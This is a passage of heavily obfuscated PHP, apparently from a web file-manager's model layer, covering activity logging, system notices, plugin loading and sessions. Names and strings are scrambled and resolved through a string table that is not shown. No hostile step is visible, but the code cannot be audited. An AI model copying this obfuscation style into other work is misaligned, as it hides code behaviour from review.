addLog($ªÒÈÃ£Ü, $Ä ŞŒá‘ = array()) { $òğÛ¯­ =& $_SERVER[®»±”ó²]; if (!isset($this->typeList[$ªÒÈÃ£Ü])) { return; } $›­Ö‹üÌ = Session::get($òğÛ¯­[2132]); if (!$›­Ö‹üÌ) { $›­Ö‹üÌ = _get($Ä ŞŒá‘, $òğÛ¯­[1791], 0); } if ($ªÒÈÃ£Ü == $òğÛ¯­[2422] && is_array($Ä ŞŒá‘[$òğÛ¯­[2457]]) && !$Ä ŞŒá‘[$òğÛ¯­[2457]]) { return; } $–ã‹ìÑ× = get_client_ip(); if (!$Ä ŞŒá‘ || strlen(json_encode($Ä ŞŒá‘)) >= 1024 * 64) { if ($Ä ŞŒá‘ && is_array($Ä ŞŒá‘)) { $Ä ŞŒá‘ = array_intersect_key($Ä ŞŒá‘, array_flip($òğÛ¯­[477], $òğÛ¯­[32])); $Ä ŞŒá‘[$òğÛ¯­[2458]] = $–ã‹ìÑ×; } else { $Ä ŞŒá‘ = array($òğÛ¯­[2458] => $–ã‹ìÑ×); } } else { if (is_array($Ä ŞŒá‘)) { $Ä ŞŒá‘[$òğÛ¯­[2458]] = $–ã‹ìÑ×; } else { $Ä ŞŒá‘ = array($òğÛ¯­[1299] => $Ä ŞŒá‘, $òğÛ¯­[2458] => $–ã‹ìÑ×); } } $Ä ŞŒá‘ = array($òğÛ¯­[1781] => Session::sign(), $òğÛ¯­[1782] => intval($›­Ö‹üÌ), $òğÛ¯­[33] => $ªÒÈÃ£Ü, $òğÛ¯­[1784] => json_encode($Ä ŞŒá‘)); return parent::add($Ä ŞŒá‘); } public function remove($€òƒÆå–) { $this->where(array($_SERVER[®»±”ó²][504] => $€òƒÆå–))->delete(); } private function _makeOrder($¿ñÜÆ€¾ = '') { $Ô©ñîÎê =& $_SERVER[®»±”ó²]; $±±ÜÁŸŞ = $Ô©ñîÎê[234]; $„éÕçÎ = array($Ô©ñîÎê[534] => $Ô©ñîÎê[535], $Ô©ñîÎê[536] => $Ô©ñîÎê[537]); $·ö…‰í” = Input::get($Ô©ñîÎê[542], $Ô©ñîÎê[7], $Ô©ñîÎê[2172], array($Ô©ñîÎê[2087], $Ô©ñîÎê[536])); $·ö…‰í” = $„éÕçÎ[$·ö…‰í”]; $¿ñÜÆ€¾ = $¿ñÜÆ€¾ . "{$±±ÜÁŸŞ}\40{$·ö…‰í”}"; return $this->order($¿ñÜÆ€¾); } public function get($æÌÇ´ÀÊ = '') { $İ”ÙÈÄŠ =& $_SERVER[®»±”ó²]; if (!$æÌÇ´ÀÊ) { show_json(array()); } $Œõìˆ¶± = array(); if ($æÌÇ´ÀÊ[$İ”ÙÈÄŠ[1791]]) { $Œõìˆ¶±[$İ”ÙÈÄŠ[1791]] = $æÌÇ´ÀÊ[$İ”ÙÈÄŠ[1791]]; } if (isset($æÌÇ´ÀÊ[$İ”ÙÈÄŠ[841]])) { $¸æóì‰ = $æÌÇ´ÀÊ[$İ”ÙÈÄŠ[841]]; $‘Ì»Åâ… = isset($æÌÇ´ÀÊ[$İ”ÙÈÄŠ[842]]) ? $æÌÇ´ÀÊ[$İ”ÙÈÄŠ[842]] : time(); $Œõìˆ¶±[$İ”ÙÈÄŠ[234]] = array($İ”ÙÈÄŠ[410], array($¸æóì‰, $‘Ì»Åâ…)); } if ($æÌÇ´ÀÊ[$İ”ÙÈÄŠ[33]]) { $Ğ¯ÊÔÛ = explode($İ”ÙÈÄŠ[50], $æÌÇ´ÀÊ[$İ”ÙÈÄŠ[33]]); $’×¾ïã¡ = $this->typeFile(); $…şÜÙêÂ = array(); foreach ($Ğ¯ÊÔÛ as $ğËış•) { $…şÜÙêÂ[] = $ğËış•; if (isset($’×¾ïã¡[$ğËış•])) { $…şÜÙêÂ = array_merge($…şÜÙêÂ, $’×¾ïã¡[$ğËış•]); } } $…şÜÙêÂ = array_unique($…şÜÙêÂ); if ($…şÜÙêÂ) { $Œõìˆ¶±[$İ”ÙÈÄŠ[33]] = array($İ”ÙÈÄŠ[7], $…şÜÙêÂ); } } else { $Œõìˆ¶±[$İ”ÙÈÄŠ[33]] = array($İ”ÙÈÄŠ[2459], $İ”ÙÈÄŠ[2460]); } if (!empty($æÌÇ´ÀÊ[$İ”ÙÈÄŠ[2458]])) { $Œõìˆ¶±[$İ”ÙÈÄŠ[537]] = array($İ”ÙÈÄŠ[461], "\45{$æÌÇ´ÀÊ[$İ”ÙÈÄŠ[2458]]}\x25"); } $º‘ß“Õ = $this->_makeOrder()->where($Œõìˆ¶±)->selectPage(); if (empty($º‘ß“Õ[$İ”ÙÈÄŠ[447]])) { show_json(array(), !0, $º‘ß“Õ[$İ”ÙÈÄŠ[444]]); } $º‘ß“Õ[$İ”ÙÈÄŠ[447]] = $this->logList($º‘ß“Õ[$İ”ÙÈÄŠ[447]]); return $º‘ß“Õ; } private function ipAddress(&$ãŸ§‘Ó¯) { $¶ú”Ä =& $_SERVER[®»±”ó²]; if (!empty($ãŸ§‘Ó¯[$¶ú”Ä[2458]])) { $±“ÀŠ« = IpLocation::get($ãŸ§‘Ó¯[$¶ú”Ä[2458]]); } else { $±“ÀŠ« = LNG($¶ú”Ä[2461]); } $ãŸ§‘Ó¯[$¶ú”Ä[2462]] = $±“ÀŠ«; } private function descZipDownload($ÍíêÎØº, &$²ş®Éƒ) { $ìĞôèé =& $_SERVER[®»±”ó²]; if (!isset($ÍíêÎØº[$ìĞôèé[2463]])) { return; } $õÜ¡›® = json_decode($ÍíêÎØº[$ìĞôèé[2463]], !0); foreach ($õÜ¡›® as $ÙÜ¶ıêú) { try { $É™×—‡ = IO::infoFullSimple($ÙÜ¶ıêú[$ìĞôèé[87]]); } catch (Exception $´¤•»¥¯) { continue; } $ÍíêÎØº[$ìĞôèé[87]] = $ÙÜ¶ıêú[$ìĞôèé[87]]; $²ş®Éƒ[] = $ÍíêÎØº[$ìĞôèé[194]] = $É™×—‡[$ìĞôèé[194]]; $²ş®Éƒ[] = $ÍíêÎØº[$ìĞôèé[2226]] = $É™×—‡[$ìĞôèé[193]]; break; } return $ÍíêÎØº; } private function getSourceList(&$õçõ§ÕÁ) { $Ò£µŸßÈ =& $_SERVER[®»±”ó²]; $–ü‘¯¡ = array(); foreach ($õçõ§ÕÁ as $°ú–çÑÖ => $Ëş–ë”) { $æª•İå² = json_decode($Ëş–ë”[$Ò£µŸßÈ[537]], !0); if ($Ëş–ë”[$Ò£µŸßÈ[33]] == $Ò£µŸßÈ[1965]) { $æª•İå² = $this->descZipDownload($æª•İå², $–ü‘¯¡); $õçõ§ÕÁ[$°ú–çÑÖ][$Ò£µŸßÈ[537]] = json_encode($æª•İå²); continue; } if (strpos($Ëş–ë”[$Ò£µŸßÈ[33]], $Ò£µŸßÈ[2228]) !== 0) { if (!isset($æª•İå²[$Ò£µŸßÈ[87]]) || strpos($Ëş–ë”[$Ò£µŸßÈ[33]], $Ò£µŸßÈ[2464]) !== 0) { continue; } try { $Ş””Ö† = IO::infoFullSimple($æª•İå²[$Ò£µŸßÈ[87]]); } catch (Exception $¡¹ë°˜“) { continue; } $–ü‘¯¡[] = $æª•İå²[$Ò£µŸßÈ[194]] = $Ş””Ö†[$Ò£µŸßÈ[194]]; $–ü‘¯¡[] = $æª•İå²[$Ò£µŸßÈ[2226]] = $Ş””Ö†[$Ò£µŸßÈ[193]]; $õçõ§ÕÁ[$°ú–çÑÖ][$Ò£µŸßÈ[537]] = json_encode($æª•İå²); continue; } $–ü‘¯¡[] = $æª•İå²[$Ò£µŸßÈ[194]]; $–ü‘¯¡[] = $æª•İå²[$Ò£µŸßÈ[2226]]; if ($æª•İå²[$Ò£µŸßÈ[33]] == $Ò£µŸßÈ[636]) { $–ü‘¯¡[] = $æª•İå²[$Ò£µŸßÈ[537]][$Ò£µŸßÈ[1251]]; $–ü‘¯¡[] = $æª•İå²[$Ò£µŸßÈ[537]][$Ò£µŸßÈ[1252]]; } if ($æª•İå²[$Ò£µŸßÈ[33]] == $Ò£µŸßÈ[2237]) { $–ü‘¯¡[] = $æª•İå²[$Ò£µŸßÈ[537]][$Ò£µŸßÈ[194]]; } } if (!$–ü‘¯¡) { return array(); } return Model($Ò£µŸßÈ[911])->sourceListInfo($–ü‘¯¡, !0); } private function logList($‡ÀÚ®º¢) { $˜¨¦Ñ‘ =& $_SERVER[®»±”ó²]; $ŒÀµïı = array_to_keyvalue($‡ÀÚ®º¢, $˜¨¦Ñ‘[12], $˜¨¦Ñ‘[1791]); $ú²˜°×Ÿ = Model($˜¨¦Ñ‘[610])->userListInfo(array_unique($ŒÀµïı)); $üÍÅš = $this->getSourceList($‡ÀÚ®º¢); $’×ª•¿Ú = $this->typeAll(); $Ó·Àæ¾¿ = array(); $ÏûĞ¨ƒ¨ = array(); foreach ($‡ÀÚ®º¢ as $Ü¥Óˆ‘Ó => $À¸Î«©²) { $¼Ù¾ÏŞ— = $À¸Î«©²[$˜¨¦Ñ‘[33]]; $éÊÜò÷ø = isset($ú²˜°×Ÿ[$À¸Î«©²[$˜¨¦Ñ‘[1791]]]) ? $ú²˜°×Ÿ[$À¸Î«©²[$˜¨¦Ñ‘[1791]]] : !1; $®ïîğ¥ø = strpos($¼Ù¾ÏŞ—, $˜¨¦Ñ‘[2465]) === 0 ? LNG($˜¨¦Ñ‘[2466]) : LNG($˜¨¦Ñ‘[2461]); $À¸Î«©²[$˜¨¦Ñ‘[32]] = isset($éÊÜò÷ø[$˜¨¦Ñ‘[32]]) ? $éÊÜò÷ø[$˜¨¦Ñ‘[32]] : LNG($˜¨¦Ñ‘[2461]); $À¸Î«©²[$˜¨¦Ñ‘[2288]] = isset($éÊÜò÷ø[$˜¨¦Ñ‘[2288]]) ? $éÊÜò÷ø[$˜¨¦Ñ‘[2288]] : $˜¨¦Ñ‘[12]; $À¸Î«©²[$˜¨¦Ñ‘[1678]] = isset($’×ª•¿Ú[$¼Ù¾ÏŞ—]) ? $’×ª•¿Ú[$¼Ù¾ÏŞ—] : $®ïîğ¥ø; $À¸Î«©²[$˜¨¦Ñ‘[2171]] = $éÊÜò÷ø; $û¼Çûõ½ = json_decode($À¸Î«©²[$˜¨¦Ñ‘[537]], !0); $À¸Î«©²[$˜¨¦Ñ‘[2458]] = isset($û¼Çûõ½[$˜¨¦Ñ‘[2458]]) ? $û¼Çûõ½[$˜¨¦Ñ‘[2458]] : $˜¨¦Ñ‘[12]; $À¸Î«©²[$˜¨¦Ñ‘[2462]] = IpLocation::get($À¸Î«©²[$˜¨¦Ñ‘[2458]]); if (strpos($¼Ù¾ÏŞ—, $˜¨¦Ñ‘[2228]) === 0 || isset($û¼Çûõ½[$˜¨¦Ñ‘[2226]])) { $û¼Çûõ½[$˜¨¦Ñ‘[90]] = $üÍÅš[$û¼Çûõ½[$˜¨¦Ñ‘[194]]]; $û¼Çûõ½[$˜¨¦Ñ‘[2242]] = $üÍÅš[$û¼Çûõ½[$˜¨¦Ñ‘[2226]]]; if ($û¼Çûõ½[$˜¨¦Ñ‘[33]] == $˜¨¦Ñ‘[636]) { $û¼Çûõ½[$˜¨¦Ñ‘[537]][$˜¨¦Ñ‘[1251]] = $üÍÅš[$û¼Çûõ½[$˜¨¦Ñ‘[537]][$˜¨¦Ñ‘[1251]]]; $û¼Çûõ½[$˜¨¦Ñ‘[537]][$˜¨¦Ñ‘[1252]] = $üÍÅš[$û¼Çûõ½[$˜¨¦Ñ‘[537]][$˜¨¦Ñ‘[1252]]]; } if ($û¼Çûõ½[$˜¨¦Ñ‘[33]] == $˜¨¦Ñ‘[2237]) { $û¼Çûõ½[$˜¨¦Ñ‘[537]][$˜¨¦Ñ‘[194]] = $üÍÅš[$û¼Çûõ½[$˜¨¦Ñ‘[537]][$˜¨¦Ñ‘[194]]]; } if ($û¼Çûõ½[$˜¨¦Ñ‘[33]] == $˜¨¦Ñ‘[1960]) { $û¼Çûõ½[$˜¨¦Ñ‘[2242]] = $û¼Çûõ½[$˜¨¦Ñ‘[90]]; $û¼Çûõ½[$˜¨¦Ñ‘[2226]] = $û¼Çûõ½[$˜¨¦Ñ‘[2242]][$˜¨¦Ñ‘[194]]; $û¼Çûõ½[$˜¨¦Ñ‘[90]] = !1; $û¼Çûõ½[$˜¨¦Ñ‘[194]] = $˜¨¦Ñ‘[12]; } $ÊËƒâßˆ = array($˜¨¦Ñ‘[1960], $˜¨¦Ñ‘[2224]); if (!in_array($û¼Çûõ½[$˜¨¦Ñ‘[33]], $ÊËƒâßˆ)) { if ($û¼Çûõ½[$˜¨¦Ñ‘[90]] && $û¼Çûõ½[$˜¨¦Ñ‘[90]][$˜¨¦Ñ‘[191]] == $˜¨¦Ñ‘[192]) { $ÏûĞ¨ƒ¨[] = $À¸Î«©²[$˜¨¦Ñ‘[477]]; unset($‡ÀÚ®º¢[$Ü¥Óˆ‘Ó]); continue; } if ($û¼Çûõ½[$˜¨¦Ñ‘[2242]] && $û¼Çûõ½[$˜¨¦Ñ‘[2242]][$˜¨¦Ñ‘[191]] == $˜¨¦Ñ‘[192]) { $ÏûĞ¨ƒ¨[] = $À¸Î«©²[$˜¨¦Ñ‘[477]]; unset($‡ÀÚ®º¢[$Ü¥Óˆ‘Ó]); continue; } } } $À¸Î«©²[$˜¨¦Ñ‘[537]] = $û¼Çûõ½; unset($À¸Î«©²[$˜¨¦Ñ‘[2467]]); $Ó·Àæ¾¿[] = $À¸Î«©²; } $this->clearSystemPathLog($ÏûĞ¨ƒ¨); return $Ó·Àæ¾¿; } private function clearSystemPathLog($ü„Ùõˆµ) { $Ö˜â‰ÃŠ =& $_SERVER[®»±”ó²]; if (count($ü„Ùõˆµ) == 0) { return; } $áµäŠñŠ = array($Ö˜â‰ÃŠ[477] => array($Ö˜â‰ÃŠ[7], array_unique($ü„Ùõˆµ))); $this->where($áµäŠñŠ)->delete(); } public function deviceList($…Â˜½ê’, $Ãá™‰¿ = 0) { $Ò­×Ë¯é =& $_SERVER[®»±”ó²]; $£•ôøíı = array($Ò­×Ë¯é[1791] => $…Â˜½ê’, $Ò­×Ë¯é[234] => array($Ò­×Ë¯é[1101], $Ãá™‰¿), $Ò­×Ë¯é[33] => $Ò­×Ë¯é[1934]); $Èå¼„¼ö = array(); $Æ‘½­Éî = $this->field($Ò­×Ë¯é[2468])->where($£•ôøíı)->order($Ò­×Ë¯é[2240])->limit(50)->select(); foreach ($Æ‘½­Éî as $äŸ•ñ“ñ => $¦Æõ¾Ùñ) { if ($äŸ•ñ“ñ > 0 && abs($¦Æõ¾Ùñ[$Ò­×Ë¯é[234]] - $Æ‘½­Éî[$äŸ•ñ“ñ - 1][$Ò­×Ë¯é[234]]) < 5) { continue; } $ÇÒ†åûù = json_decode($¦Æõ¾Ùñ[$Ò­×Ë¯é[537]], !0); $¦Æõ¾Ùñ[$Ò­×Ë¯é[2458]] = isset($ÇÒ†åûù[$Ò­×Ë¯é[2458]]) ? $ÇÒ†åûù[$Ò­×Ë¯é[2458]] : $Ò­×Ë¯é[12]; unset($ÇÒ†åûù[$Ò­×Ë¯é[2458]]); $ƒÕ²…•¢ = $this->deviceType($ÇÒ†åûù[$Ò­×Ë¯é[2229]]); if (isset($Èå¼„¼ö[$ƒÕ²…•¢])) { continue; } $¦Æõ¾Ùñ[$Ò­×Ë¯é[2462]] = IpLocation::get($¦Æõ¾Ùñ[$Ò­×Ë¯é[2458]]); $¦Æõ¾Ùñ[$Ò­×Ë¯é[537]] = $ÇÒ†åûù; $Èå¼„¼ö[$ƒÕ²…•¢] = $¦Æõ¾Ùñ; } return array_values($Èå¼„¼ö); } public function deviceType($Ã°Æ†›–) { return $Ã°Æ†›–; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\156\x6f\x74\x69\x63\145\114\x69\163\x74"; public $field = array("\x6e\141\155\x65", "\x63\157\x6e\x74\x65\x6e\164", "\x61\165\164\150", "\x6d\157\144\x65", "\164\151\x6d\x65", "\x74\x79\x70\145", "\x6c\x65\166\145\x6c", "\x65\x6e\141\x62\154\145", "\x73\157\162\164"); public function listData($Ã˜‹à–æ = false, $³ìÎ’Ò¢ = "\x73\157\x72\164", $Ì›ÔË“ó = false) { return parent::listData($Ã˜‹à–æ, $³ìÎ’Ò¢, $Ì›ÔË“ó); } public function add($ÉàÃèø) { $€äõÆ‡ =& $_SERVER[®»±”ó²]; $‡“©Í¶‰ = time(); if ($ÉàÃèø[$€äõÆ‡[16]] == $€äõÆ‡[2469]) { $‡“©Í¶‰ = strtotime($ÉàÃèø[$€äõÆ‡[207]]); } $ÉàÃèø[$€äõÆ‡[207]] = $‡“©Í¶‰; return parent::insert($ÉàÃèø); } public function update($€çš§ÁÂ, $“€˜œ¡¦) { $åÖŒ‚¡’ =& $_SERVER[®»±”ó²]; $æ¤í¡Ï = $this->listData($€çš§ÁÂ); if (!$æ¤í¡Ï) { return !1; } $™¥ÑÆë‘ = time(); if ($“€˜œ¡¦[$åÖŒ‚¡’[16]] == $åÖŒ‚¡’[2469]) { $™¥ÑÆë‘ = strtotime($“€˜œ¡¦[$åÖŒ‚¡’[207]]); } $“€˜œ¡¦[$åÖŒ‚¡’[207]] = $™¥ÑÆë‘; return parent::update($€çš§ÁÂ, $“€˜œ¡¦); } public function remove($§ı¾†²) { $Å‘Å–ˆš = $this->listData($§ı¾†²); if (!$Å‘Å–ˆš || $Å‘Å–ˆš[$_SERVER[®»±”ó²][192]]) { return !1; } return parent::remove($§ı¾†²); } public function sort($ş‚äùÖÑ, $‰›ò”ìè) { return parent::update($ş‚äùÖÑ, $‰›ò”ìè); } public function enable($ƒÔë†¶Û, $•° è«) { return parent::update($ƒÔë†¶Û, array($_SERVER[®»±”ó²][2470] => $•° è«)); } private function initUserOption() { $ç‹Ø´Ÿœ =& $_SERVER[®»±”ó²]; $this->optionType = $ç‹Ø´Ÿœ[2471]; $this->modelType = $ç‹Ø´Ÿœ[2472]; $this->field = array($ç‹Ø´Ÿœ[2473], $ç‹Ø´Ÿœ[32], $ç‹Ø´Ÿœ[207], $ç‹Ø´Ÿœ[33], $ç‹Ø´Ÿœ[2474], $ç‹Ø´Ÿœ[830], $ç‹Ø´Ÿœ[229]); } public function userNoticeGet($şÕø›·µ = false) { $this->initUserOption(); return parent::listData($şÕø›·µ, $_SERVER[®»±”ó²][477], !0); } public function userNoticeAdd($Š™Ñ¨û€) { $îÎ½ìµÄ =& $_SERVER[®»±”ó²]; $this->initUserOption(); $Ò™¸º¥õ = $this->findByKey($îÎ½ìµÄ[2473], $Š™Ñ¨û€[$îÎ½ìµÄ[477]]); if ($Ò™¸º¥õ) { return !0; } $ãÉ“—Ç‡ = array($îÎ½ìµÄ[2473] => $Š™Ñ¨û€[$îÎ½ìµÄ[477]], $îÎ½ìµÄ[32] => $Š™Ñ¨û€[$îÎ½ìµÄ[32]], $îÎ½ìµÄ[207] => $Š™Ñ¨û€[$îÎ½ìµÄ[207]], $îÎ½ìµÄ[33] => isset($Š™Ñ¨û€[$îÎ½ìµÄ[33]]) ? $Š™Ñ¨û€[$îÎ½ìµÄ[33]] : 1, $îÎ½ìµÄ[2474] => isset($Š™Ñ¨û€[$îÎ½ìµÄ[2474]]) ? $Š™Ñ¨û€[$îÎ½ìµÄ[2474]] : 0, $îÎ½ìµÄ[830] => 0, $îÎ½ìµÄ[229] => 0); return parent::insert($ãÉ“—Ç‡); } public function userNoticeEdit($äùëÎğÜ, $ÎÉãÂ›”) { $this->initUserOption(); return parent::update($äùëÎğÜ, $ÎÉãÂ›”); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\145\x6d\137\x6f\160\x74\x69\157\156"; protected $jsonField = array("\155\145\156\x75", "\x72\157\x6c\145", "\x72\157\154\145\x47\162\157\x75\160", "\x72\x65\x67\151\163\164", "\145\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($øó–Ó‰¬) { return "\123\171\163\x74\x65\155\117\x70\164\151\x6f\x6e\137{$øó–Ó‰¬}"; } protected function optionDefault($ŒÏ˜½‹ë = '') { $ö¦¾½şÊ =& $_SERVER[®»±”ó²]; if ($ŒÏ˜½‹ë == $ö¦¾½şÊ[12]) { return $GLOBALS[$ö¦¾½şÊ[6]][$ö¦¾½şÊ[459]]; } } } goto e Â‡Î…±î; aºÄÕî½±: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\160\154\165\147\151\x6e\x4c\x69\163\x74"; public $field = array("\156\141\155\145", "\x73\164\x61\164\165\x73", "\162\x65\x67\151\x65\x73\x74", "\143\157\x6e\146\x69\147"); public function loadList($ğÍú´¨ = false) { $üŸš¸Ä‹ = array_to_keyvalue($this->listData(), $_SERVER[®»±”ó²][32]); if ($ğÍú´¨) { return $üŸš¸Ä‹[$ğÍú´¨]; } return $üŸš¸Ä‹; } public function init() { $™Æ“©ÙÃ =& $_SERVER[®»±”ó²]; Hook::trigger($™Æ“©ÙÃ[2115]); $Üñ…»ã = $this->loadPluginList(); foreach ($Üñ…»ã as $Á•û™’Î => $øòóËªí) { $¼Ô³ = $this->appAllow($Á•û™’Î, $øòóËªí); if (!$¼Ô³) { continue; } foreach ($øòóËªí[$™Æ“©ÙÃ[2116]] as $­«ºä™ => $ÓÑ¢ÈÊ­) { Hook::bind($­«ºä™, $ÓÑ¢ÈÊ­); } } Hook::trigger($™Æ“©ÙÃ[2117]); Hook::trigger(ACTION); } public function appAllow($ìôØÉÚ‚, $…£öÍªª, $´„×‘û¯ = true) { $¦Ï¯Å‰¥ =& $_SERVER[®»±”ó²]; $·î§’ó² = PLUGIN_DIR . $ìôØÉÚ‚ . $¦Ï¯Å‰¥[2118]; if (!is_array($…£öÍªª) || !is_array($…£öÍªª[$¦Ï¯Å‰¥[2116]]) || $…£öÍªª[$¦Ï¯Å‰¥[830]] != 1 || !is_file($·î§’ó²)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$¦Ï¯Å‰¥[6]][$¦Ï¯Å‰¥[2119]] || !$GLOBALS[$¦Ï¯Å‰¥[6]][$¦Ï¯Å‰¥[2120]]) { return !0; } $µ–Ö‚å€ = explode($¦Ï¯Å‰¥[50], strtolower($GLOBALS[$¦Ï¯Å‰¥[6]][$¦Ï¯Å‰¥[2120]])); return in_array(strtolower($ìôØÉÚ‚), $µ–Ö‚å€) ? !1 : !0; } if ($´„×‘û¯ && !Action($¦Ï¯Å‰¥[2121])->checkAuth($ìôØÉÚ‚)) { return !1; } return !0; } public function unInstall($½€Î Öı) { $¢ø¤æ° =& $_SERVER[®»±”ó²]; $ëƒĞÌ¾É = $this->loadList($½€Î Öı); if (file_exists(PLUGIN_DIR . $½€Î Öı)) { Hook::apply($½€Î Öı . $¢ø¤æ°[2122]); } $this->remove($ëƒĞÌ¾É[$¢ø¤æ°[477]]); } public function changeStatus($­İ­†…, $˜Šåı) { $óÜÍÛâ• =& $_SERVER[®»±”ó²]; $¶ûÛ˜˜’ = $this->loadList($­İ­†…); if ($˜Šåı) { Hook::apply($­İ­†… . $óÜÍÛâ•[2123]); } $this->update($¶ûÛ˜˜’[$óÜÍÛâ•[477]], array($óÜÍÛâ•[2124] => $˜Šåı)); } public function appRegist($ãµ ˆóÆ, $’üáñÜÌ) { $¥Ş¤ àõ =& $_SERVER[®»±”ó²]; $ıÍ‰˜¶ = $this->loadList($ãµ ˆóÆ); if ($ıÍ‰˜¶) { $this->update($ıÍ‰˜¶[$¥Ş¤ àõ[477]], array($¥Ş¤ àõ[2116] => $’üáñÜÌ)); } else { $¸ïç°Ó = array($¥Ş¤ àõ[32] => $ãµ ˆóÆ, $¥Ş¤ àõ[2116] => $’üáñÜÌ, $¥Ş¤ àõ[830] => 0, $¥Ş¤ àõ[6] => $this->getConfigDefault($ãµ ˆóÆ)); $this->insert($¸ïç°Ó); } } public function getConfigDefault($×™ÜåŒ) { $Œ¦­Ú¢É =& $_SERVER[®»±”ó²]; $¨õ½°¡ = array(); $É•˜œôİ = $this->getPackageJson($×™ÜåŒ); if (!$É•˜œôİ && is_array($É•˜œôİ[$Œ¦­Ú¢É[2125]])) { return $¨õ½°¡; } foreach ($É•˜œôİ[$Œ¦­Ú¢É[2125]] as $Š„¯óÔÉ => $êıè•ë€) { if (!isset($êıè•ë€[$Œ¦­Ú¢É[452]]) || isset($¨õ½°¡[$Š„¯óÔÉ])) { continue; } $¨õ½°¡[$Š„¯óÔÉ] = $êıè•ë€[$Œ¦­Ú¢É[452]]; } return $¨õ½°¡; } public function getPackageJson($ÜÉã¢‘Ó) { return Hook::apply($ÜÉã¢‘Ó . $_SERVER[®»±”ó²][2126]); } public function getConfig($ı¯ÌÉ®˜, $ÛÏ¨šéé = false) { $ü³ïø˜ =& $_SERVER[®»±”ó²]; $¼ÕÙ§…Ë = array(); $™¡íÊ½ú = $this->loadList($ı¯ÌÉ®˜); if ($™¡íÊ½ú && is_array($™¡íÊ½ú[$ü³ïø˜[6]])) { $¼ÕÙ§…Ë = $™¡íÊ½ú[$ü³ïø˜[6]]; } if (!$¼ÕÙ§…Ë || $ÛÏ¨šéé) { $¼ÕÙ§…Ë = $this->getConfigDefault($ı¯ÌÉ®˜); } return $¼ÕÙ§…Ë; } public function setConfig($í–ÜÜ“‰, $ü¨°º£¶ = false) { $€Ü¯ıûŸ =& $_SERVER[®»±”ó²]; $µèŒ´–– = $this->loadList($í–ÜÜ“‰); if (!$µèŒ´––) { return !1; } $ãôÔ›ù¦ = $µèŒ´––[$€Ü¯ıûŸ[6]]; if ($ü¨°º£¶ == !1) { $ãôÔ›ù¦ = array(); $ü¨°º£¶ = $this->getConfigDefault($í–ÜÜ“‰); } foreach ($ü¨°º£¶ as $Ü™Å¥¿Ô => $§éŞ§Çš) { $ãôÔ›ù¦[$Ü™Å¥¿Ô] = is_string($§éŞ§Çš) ? trim($§éŞ§Çš) : $§éŞ§Çš; } $this->update($µèŒ´––[$€Ü¯ıûŸ[477]], array($€Ü¯ıûŸ[6] => $ãôÔ›ù¦)); } public function viewList() { $Õ™œé½ =& $_SERVER[®»±”ó²]; $”şËã©° = $this->loadList(); $this->pluginScan($”şËã©°); $”şËã©° = $this->loadPluginList(); $„öäšĞ = array(); foreach ($”şËã©° as $â¿ĞÔ => $²ÉÉäï®) { $Ã£—Ô¶Æ = $²ÉÉäï®; unset($²ÉÉäï®[$Õ™œé½[2116]], $²ÉÉäï®[$Õ™œé½[6]]); $¸ŸÕê€ = PLUGIN_DIR . $²ÉÉäï®[$Õ™œé½[32]] . $Õ™œé½[2118]; if (!is_file($¸ŸÕê€)) { continue; } $áœâ“×¬ = Hook::apply($²ÉÉäï®[$Õ™œé½[32]] . $Õ™œé½[2126]); if (!is_array($áœâ“×¬)) { continue; } $„öäšĞ[$â¿ĞÔ] = array_merge($²ÉÉäï®, $áœâ“×¬); if ($Ã£—Ô¶Æ[$Õ™œé½[6]][$Õ™œé½[1703]] != $áœâ“×¬[$Õ™œé½[1677]]) { Hook::apply($²ÉÉäï®[$Õ™œé½[32]] . $Õ™œé½[2123]); $Ã£—Ô¶Æ[$Õ™œé½[6]][$Õ™œé½[1703]] = $áœâ“×¬[$Õ™œé½[1677]]; $this->update($²ÉÉäï®[$Õ™œé½[477]], array($Õ™œé½[6] => $Ã£—Ô¶Æ[$Õ™œé½[6]])); } } return $„öäšĞ; } private function loadPluginList() { $İ³£û‹µ =& $_SERVER[®»±”ó²]; $Ïâàû = $this->loadList(); if (strtolower(MOD) == $İ³£û‹µ[2127]) { return $Ïâàû; } $ÃÆøö€Ï = Hook::trigger($İ³£û‹µ[2128], $Ïâàû); if ($Ïâàû && !$ÃÆøö€Ï) { die; } return $ÃÆøö€Ï ? $ÃÆøö€Ï : $Ïâàû; } private function pluginScan($ä¨ãÈã) { $ÖÂå°şä =& $_SERVER[®»±”ó²]; recursion_dir(PLUGIN_DIR, $ç›ËŠ¦¹, $éîå¨§, 0); foreach ($ç›ËŠ¦¹ as $æãåÌ†ë) { $³¶¦…Ä  = get_path_this($æãåÌ†ë); if (isset($ä¨ãÈã[$³¶¦…Ä ]) || !file_exists($æãåÌ†ë . $ÖÂå°şä[2129]) || !file_exists($æãåÌ†ë . $ÖÂå°şä[2118])) { continue; } Hook::apply($³¶¦…Ä  . $ÖÂå°şä[2123]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\145\155\x5f\163\x65\163\x73\151\x6f\x6e"; public function get($¼‚ßºÂ) { $Ş»§Â ¾ =& $_SERVER[®»±”ó²]; $Ï·ï¥Í = $this->where(array($Ş»§Â ¾[2130] => $¼‚ßºÂ))->find(); if (!is_array($Ï·ï¥Í)) { return !1; } return $Ï·ï¥Í[$Ş»§Â ¾[171]]; } public function set($‹ŒÄï¸ğ, $ë©¬’Š±, $¯ù×Ä¿¤ = 3600) { $î¥¥°Õ¨ =& $_SERVER[®»±”ó²]; $’’½å ¿ = array($î¥¥°Õ¨[2130] => $‹ŒÄï¸ğ, $î¥¥°Õ¨[2030] => $ë©¬’Š±, $î¥¥°Õ¨[2131] => $¯ù×Ä¿¤ + time()); if (Session::get($î¥¥°Õ¨[2132])) { $’’½å ¿[$î¥¥°Õ¨[1791]] = Session::get($î¥¥°Õ¨[2132]); } else { $’’½å ¿[$î¥¥°Õ¨[1791]] = 0; } if ($this->get($‹ŒÄï¸ğ)) { return $this->where(array($î¥¥°Õ¨[2130] => $‹ŒÄï¸ğ))->save($’’½å ¿); } else { return $this->add($’’½å ¿, array(), !0); } } public function remove($¹ªû¼úÀ) { return $this->where(array($_SERVER[®»±”ó²][2130] => $¹ªû¼úÀ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[®»±”ó²][2133] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = 